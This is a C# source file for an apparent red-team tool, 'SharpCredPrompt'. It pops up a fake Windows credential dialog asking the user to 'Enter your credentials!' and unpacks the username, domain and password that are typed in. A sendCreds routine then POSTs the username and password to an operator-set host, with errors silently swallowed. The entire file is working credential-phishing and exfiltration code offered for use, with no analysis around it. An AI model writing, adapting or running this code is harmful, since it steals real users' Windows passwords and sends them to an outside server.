using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;
using System.Collections.Specialized;

namespace SharpCredPrompt
{
       
    class Program
    {
        public static NetworkCredential NetworkCredential { get; private set; }

        [System.Runtime.InteropServices.DllImport("credui", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
        private static extern uint CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,
             int authError,
             ref uint authPackage,
             IntPtr InAuthBuffer,
             uint InAuthBufferSize,
             out IntPtr refOutAuthBuffer,
             out uint refOutAuthBufferSize,
             ref bool fSave,
             PromptForWindowsCredentialsFlags flags);

        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        private static extern bool CredUnPackAuthenticationBuffer(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);

        [DllImport("ole32.dll")]
        public static extern void CoTaskMemFree(IntPtr ptr);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CREDUI_INFO
        {
            public int cbSize;
            public IntPtr hwndParent;
            public string pszMessageText;
            public string pszCaptionText;
            public IntPtr hbmBanner;
        }

        [Flags]
        private enum PromptForWindowsCredentialsFlags
        {
             CREDUIWIN_GENERIC = 0x1,
             CREDUIWIN_CHECKBOX = 0x2,
             CREDUIWIN_AUTHPACKAGE_ONLY = 0x10,
             CREDUIWIN_IN_CRED_ONLY = 0x20,
             CREDUIWIN_ENUMERATE_ADMINS = 0x100,
             CREDUIWIN_ENUMERATE_CURRENT_USER = 0x200,
             CREDUIWIN_SECURE_PROMPT = 0x1000,
             CREDUIWIN_PACK_32_WOW = 0x10000000,
        }

        static void Main(string[] args)
        {
            bool save = false;
            int errorcode = 0;
            uint dialogReturn;
            uint authPackage = 0;
            IntPtr outCredBuffer;
            uint outCredSize;
            var usernameBuf = new StringBuilder(100);
            var passwordBuf = new StringBuilder(100);
            var domainBuf = new StringBuilder(100);
            int maxUserName = 100;
            int maxDomain = 100;
            int maxPassword = 100;
            string host = "";

            CREDUI_INFO credui = new CREDUI_INFO();
            credui.cbSize = Marshal.SizeOf(credui);
            credui.pszCaptionText = "Connect to your application";
            credui.pszMessageText = "Enter your credentials!";

            //Show the dialog
            dialogReturn = CredUIPromptForWindowsCredentials(ref credui,
            errorcode,
            ref authPackage,
            (IntPtr)0,  //You can force that a specific username is shown in the dialog. Create it with 'CredPackAuthenticationBuffer()'. Then, the buffer goes here...
            0,          //...and the size goes here. You also have to add CREDUIWIN_IN_CRED_ONLY to the flags (last argument).
            out outCredBuffer,
            out outCredSize,
            ref save,
            0); //Use the PromptForWindowsCredentialsFlags-Enum here. You can use multiple flags if you seperate them with | .

            if (dialogReturn == 0)
            {
                // Setting the value of this parameter to CRED_PACK_PROTECTED_CREDENTIALS specifies that the function attempts to decrypt the credentials in the authentication buffer. If the credential cannot be decrypted, the function returns FALSE, and a call to the GetLastError function will return the value ERROR_NOT_CAPABLE.
                if (CredUnPackAuthenticationBuffer(1, outCredBuffer, outCredSize, usernameBuf, ref maxUserName, domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
                {
                    //clear the memory allocated by CredUIPromptForWindowsCredentials
                    CoTaskMemFree(outCredBuffer);
                    NetworkCredential = new NetworkCredential()
                    {
                        UserName = usernameBuf.ToString(),
                        Password = passwordBuf.ToString(),
                        Domain = domainBuf.ToString()
                    };

                    sendCreds(host, usernameBuf.ToString(), NetworkCredential.Password);
                }
            }
        }

        static void sendCreds(string host, string username, string password)
        {
            try
            {
                using (var wb = new WebClient())
                {
                    var data = new NameValueCollection();
                    data["username"] = username;
                    data["password"] = password;

                    var response = wb.UploadValues(host, "POST", data);
                    string responseInString = Encoding.UTF8.GetString(response);
                }
            }
            catch (Exception e) { }
        }

    }
}


